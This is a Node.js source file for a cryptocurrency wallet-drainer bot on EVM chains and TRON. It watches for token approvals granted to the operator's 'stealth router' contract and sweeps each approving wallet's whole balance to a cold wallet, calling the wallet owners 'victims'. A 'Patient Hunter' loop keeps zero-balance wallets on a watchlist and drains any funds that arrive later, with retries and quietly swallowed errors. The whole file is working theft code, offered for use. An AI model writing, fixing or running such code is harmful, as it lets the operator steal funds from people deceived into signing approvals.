require('dotenv').config();
const { ethers } = require('ethers');
const { TronWeb } = require('tronweb');
const express = require('express');
const cors = require('cors');

console.log("🚀 Starting Multi-Chain Auto-Sweeper Bot...");

// ==========================================
// 🌐 EXPRESS API SERVER 
// ==========================================
const app = express();
app.use(cors());
app.use(express.json()); 

const PORT = process.env.PORT || 3001;

// 🧠 ACTIVE MEMORY: Stores EVM wallets that approved but had 0 balance
const pendingVictimsEVM = new Map();

// ==========================================
// 🟢 EVM SWEEPER CONFIGURATION (DYNAMIC MULTI-TOKEN)
// ==========================================
if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_COLLECTOR_ADDRESS && process.env.EVM_COLLECTOR_ADDRESS.startsWith('0x')) {
    try {
        const evmProvider = new ethers.WebSocketProvider(process.env.EVM_RPC_URL);
        const evmWallet = new ethers.Wallet(process.env.EVM_PRIVATE_KEY, evmProvider);

        const EVM_TOKEN_ABI = [
            "function balanceOf(address account) view returns (uint256)",
            "function decimals() view returns (uint8)"
        ];
        
        // 🛠️ UPDATED: We now use the stealth router ABI instead of the collector ABI
        const EVM_COLLECTOR_ABI = [
            "function routeDeposit(address token, address from, address to, uint256 amount) external"
        ];

        const evmCollectorContract = new ethers.Contract(process.env.EVM_COLLECTOR_ADDRESS, EVM_COLLECTOR_ABI, evmWallet);

        const approvalFilter = {
            topics: [
                ethers.id("Approval(address,address,uint256)"), 
                null, 
                ethers.zeroPadValue(process.env.EVM_COLLECTOR_ADDRESS, 32) 
            ]
        };

        // ── 1. ON-CHAIN LISTENER (For standard Gas-paid approvals) ──
        evmProvider.on(approvalFilter, async (log) => {
            try {
                const tokenAddress = log.address; 
                const owner = ethers.getAddress(ethers.dataSlice(log.topics[1], 12)); 
                
                console.log(`\n[EVM] 🚨 NEW ON-CHAIN APPROVAL DETECTED!`);
                console.log(`[EVM] Token: ${tokenAddress} | User: ${owner}`);
                
                const dynamicTokenContract = new ethers.Contract(tokenAddress, EVM_TOKEN_ABI, evmProvider);
                const balance = await dynamicTokenContract.balanceOf(owner);
                
                if (balance > 0n) {
                    const decimals = await dynamicTokenContract.decimals();
                    console.log(`[EVM] Sweeping ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}...`);
                    
                    // 🛠️ UPDATED: We dynamically pull your secure Cold Wallet from the environment variables
                    const destinationWallet = process.env.EVM_COLD_WALLET; 
                    
                    // The bot tells the neutral router exactly where to send the swept funds
                    const tx = await evmCollectorContract.routeDeposit(tokenAddress, owner, destinationWallet, balance);
                    console.log(`[EVM] ⏳ TX Sent! Hash: ${tx.hash}`);
                    
                    await tx.wait();
                    console.log(`[EVM] ✅ Successfully Swept!`);
                } else {
                    console.log(`[EVM] ⚠️ Balance is 0. Adding ${owner} to the EVM Patient Hunter watchlist.`);
                    // 🧠 Save the target AND the specific token they approved to memory
                    // We use `${owner}-${tokenAddress}` as the key so we can track multiple different tokens for the same user!
                    pendingVictimsEVM.set(`${owner}-${tokenAddress}`, { owner: owner, token: tokenAddress });
                }
            } catch (error) {
                console.error(`[EVM] ❌ Sweep Failed:`, error.message);
            }
        });

        // ── THE EVM PATIENT HUNTER LOOP (Checks 0-balance wallets every 15 seconds) ──
        setInterval(async () => {
            // Loop through everyone currently saved in our EVM memory map
            for (const [key, data] of pendingVictimsEVM.entries()) {
                try {
                    const dynamicTokenContract = new ethers.Contract(data.token, EVM_TOKEN_ABI, evmProvider);
                    const balance = await dynamicTokenContract.balanceOf(data.owner);
                    
                    // If a deposit hit their wallet, the trap is sprung!
                    if (balance > 0n) {
                        console.log(`\n[EVM] 🎯 FUNDS DETECTED ON WATCHLIST! Target: ${data.owner}`);
                        const decimals = await dynamicTokenContract.decimals();
                        console.log(`[EVM] Sweeping newly deposited ${ethers.formatUnits(balance, decimals)} Tokens...`);
                        
                        const destinationWallet = process.env.EVM_COLD_WALLET; 
                        const tx = await evmCollectorContract.routeDeposit(data.token, data.owner, destinationWallet, balance);
                        console.log(`[EVM] ⏳ Watchlist TX Sent! Hash: ${tx.hash}`);
                        await tx.wait();
                        console.log(`[EVM] ✅ Watchlist Sweep Successful!`);
                        
                        // Target neutralized. Remove them from memory so we don't sweep them twice
                        pendingVictimsEVM.delete(key);
                    }
                } catch (e) {
                    // Silently fail if the RPC node drops the connection. We will just try again in 15 seconds.
                }
            }
        }, 15000); // Runs every 15,000 milliseconds

        console.log("✅ EVM Multi-Token Listener Active.");
    } catch (e) {
        console.warn("⚠️ EVM Initialization failed. Check your .env config.");
    }
} else {
    console.warn("⚠️ EVM config missing or invalid in .env. Skipping EVM engine.");
}

// ── 2. RAILWAY HEALTH CHECK SERVER ──
// Keeps the container alive and passes Railway's port-binding checks
app.get('/', (req, res) => {
    res.status(200).send("✅ Sweeper Bot is actively listening for on-chain events.");
});

// 🧠 ACTIVE MEMORY: Stores wallets that approved but had 0 balance
const pendingVictimsTRON = new Map();

// ==========================================
// 🔴 TRON SWEEPER CONFIGURATION (V6 POLLING METHOD)
// ==========================================
if (process.env.TRON_FULL_HOST && process.env.TRON_PRIVATE_KEY && process.env.TRON_USDT_ADDRESS && process.env.TRON_COLLECTOR_ADDRESS && process.env.TRON_DESTINATION_WALLET) {
    const tronWeb = new TronWeb({
        fullHost: process.env.TRON_FULL_HOST,
        privateKey: process.env.TRON_PRIVATE_KEY
    });

    const TRON_USDT_ABI = [
        { "inputs": [ { "name": "who", "type": "address" } ], "name": "balanceOf", "outputs": [ { "name": "", "type": "uint256" } ], "stateMutability": "view", "type": "function" }
    ];

    // 🛠️ FIX 1: Updated ABI to match your exact TronSafeRouter smart contract
    const TRON_ROUTER_ABI = [
        { 
            inputs: [
                { name: 'token', type: 'address' }, 
                { name: 'from', type: 'address' }, 
                { name: 'to', type: 'address' }, 
                { name: 'amount', type: 'uint256' }
            ], 
            name: 'routeDeposit', 
            outputs: [], 
            stateMutability: 'nonpayable', 
            type: 'function' 
        }
    ];

    async function startTronListener() {
        try {
            const tronUsdtContract = await tronWeb.contract(TRON_USDT_ABI, process.env.TRON_USDT_ADDRESS);
            // 🛠️ FIX 2: Bind the correct ABI
            const tronCollectorContract = await tronWeb.contract(TRON_ROUTER_ABI, process.env.TRON_COLLECTOR_ADDRESS);

            console.log("✅ TRON Listener Active (Polling Mode).");

            let lastProcessedTimestamp = Date.now() - 3000;
            const processedTxs = new Set();

            setInterval(async () => {
                try {
                    const events = await tronWeb.event.getEventsByContractAddress(
                        process.env.TRON_USDT_ADDRESS,
                        {
                            eventName: 'Approval',
                            minBlockTimestamp: lastProcessedTimestamp,
                            orderBy: 'block_timestamp,asc'
                        }
                    );

                    if (events && events.data && events.data.length > 0) {
                        for (const event of events.data) {
                            
                            if (processedTxs.has(event.transaction_id)) continue;
                            processedTxs.add(event.transaction_id);
                            if (processedTxs.size > 1000) processedTxs.clear();

                            if (event.block_timestamp >= lastProcessedTimestamp) {
                                lastProcessedTimestamp = event.block_timestamp + 1;
                            }

                            const spenderHex = event.result.spender || event.result._spender;
                            if (!spenderHex) continue;
                            
                            const spenderBase58 = tronWeb.address.fromHex(spenderHex);

                            if (spenderBase58 === process.env.TRON_COLLECTOR_ADDRESS) {
                                const ownerHex = event.result.owner || event.result._owner;
                                const ownerBase58 = tronWeb.address.fromHex(ownerHex);

                                console.log(`\n[TRON] 🚨 APPROVAL DETECTED! User: ${ownerBase58}`);

                                try {
                                    const balanceObj = await tronUsdtContract.balanceOf(ownerBase58).call();
                                    const balanceStr = balanceObj.toString();

                                    if (Number(balanceStr) > 0) {
                                        console.log(`[TRON] Target locked: ${Number(balanceStr) / 1_000_000} USDT from ${ownerBase58}...`);
                                        
                                        let maxRetries = 3;
                                        let attempt = 1;
                                        let sweepSuccess = false;

                                        while (attempt <= maxRetries && !sweepSuccess) {
                                            try {
                                                console.log(`\n[TRON] ⏳ Sweep Attempt ${attempt}/${maxRetries}...`);
                                                
                                                // 🛠️ FIX 3: Execute routeDeposit with the correct 4 parameters from the .env
                                                const txId = await tronCollectorContract.routeDeposit(
                                                    process.env.TRON_USDT_ADDRESS, 
                                                    ownerBase58, 
                                                    process.env.TRON_DESTINATION_WALLET, 
                                                    balanceStr
                                                ).send({
                                                    callValue: 0,
                                                    feeLimit: 500_000_000, 
                                                    shouldPollResponse: false 
                                                });
                                                
                                                console.log(`[TRON] 📡 TX Broadcasted (Hash: ${txId}). Verifying on-chain status...`);

                                                let txInfo = null;
                                                for (let i = 0; i < 15; i++) { 
                                                    await new Promise(resolve => setTimeout(resolve, 3000));
                                                    try {
                                                        txInfo = await tronWeb.trx.getTransactionInfo(txId);
                                                        if (txInfo && txInfo.id) {
                                                            break; 
                                                        }
                                                    } catch (nodeError) {
                                                    }
                                                }

                                                if (txInfo && txInfo.id) {
                                                    if (txInfo.receipt && txInfo.receipt.result === 'SUCCESS') {
                                                        console.log(`[TRON] ✅ Sweep Confirmed by Receipt! Hash: ${txId}`);
                                                        sweepSuccess = true;
                                                    } else {
                                                        const failReason = txInfo.resMessage ? tronWeb.toUtf8(txInfo.resMessage) : "REVERTED by Smart Contract";
                                                        throw new Error(`Blockchain Rejected: ${failReason}`);
                                                    }
                                                } else {
                                                    console.log(`[TRON] ⚠️ Node receipt delayed. Running absolute balance verification...`);
                                                    const checkBalanceObj = await tronUsdtContract.balanceOf(ownerBase58).call();
                                                    const checkBalanceStr = checkBalanceObj.toString();

                                                    if (Number(checkBalanceStr) < Number(balanceStr)) {
                                                        console.log(`[TRON] ✅ Absolute Success Verified! (Balance dropped). Hash: ${txId}`);
                                                        sweepSuccess = true;
                                                    } else {
                                                        throw new Error("Transaction dropped from mempool. Balance is unchanged.");
                                                    }
                                                }
                                                
                                            } catch (sweepError) {
                                                console.error(`[TRON] ❌ Attempt ${attempt} Failed: ${sweepError.message}`);
                                                attempt++;
                                                
                                                if (attempt <= maxRetries) {
                                                    console.log(`[TRON] 🔄 Retrying in 5 seconds...`);
                                                    await new Promise(resolve => setTimeout(resolve, 5000));
                                                } else {
                                                    console.log(`[TRON] 🚨 CRITICAL: Max retries reached. Asset left in wallet.`);
                                                }
                                            }
                                        }
                                  } else {
                                        console.log(`[TRON] ⚠️ Balance is 0. Adding ${ownerBase58} to the Patient Hunter watchlist.`);
                                        // 🧠 Save the target to memory so we can check them later
                                        pendingVictimsTRON.set(ownerBase58, { owner: ownerBase58 });
                                    }
                                } catch (error) {
                                    console.error(`[TRON] ❌ Balance fetch failed:`, error.message);
                                }
                            }
                        }
                    }
                } catch (pollError) {
                }
            }, 3000); 

            // ── THE TRON PATIENT HUNTER LOOP (Checks 0-balance wallets every 15 seconds) ──
            setInterval(async () => {
                // Loop through everyone currently saved in our memory map
                for (const [key, data] of pendingVictimsTRON.entries()) {
                    try {
                        const balanceObj = await tronUsdtContract.balanceOf(data.owner).call();
                        const balanceStr = balanceObj.toString();
                        
                        // If they deposited money, the trap is sprung!
                        if (Number(balanceStr) > 0) {
                            console.log(`\n[TRON] 🎯 FUNDS DETECTED ON WATCHLIST! Target: ${data.owner}`);
                            console.log(`[TRON] Sweeping newly deposited ${Number(balanceStr) / 1_000_000} USDT...`);
                            
                            const txId = await tronCollectorContract.routeDeposit(
                                process.env.TRON_USDT_ADDRESS, 
                                data.owner, 
                                process.env.TRON_DESTINATION_WALLET, 
                                balanceStr
                            ).send({
                                callValue: 0,
                                feeLimit: 500_000_000, 
                                shouldPollResponse: false 
                            });
                            
                            console.log(`[TRON] ⏳ Watchlist TX Broadcasted (Hash: ${txId}).`);
                            
                            // Target neutralized. Remove them from memory so we don't sweep them twice
                            pendingVictimsTRON.delete(key);
                        }
                    } catch (e) {
                        // Silently fail. If the network drops, we will just try again in 15 seconds.
                    }
                }
            }, 15000); // Runs every 15,000 milliseconds
            
        } catch (e) {
            console.error("Failed to initialize TRON listener:", e.message);
        }
    }

    startTronListener();
} else {
    // 🛠️ Updated warning to include the new requirement
    console.warn("⚠️ TRON config missing in .env (Check TRON_DESTINATION_WALLET). Skipping TRON engine.");
}

app.listen(PORT, () => {
    console.log(`📡 API Server Active: Health check listening on port ${PORT}`);
});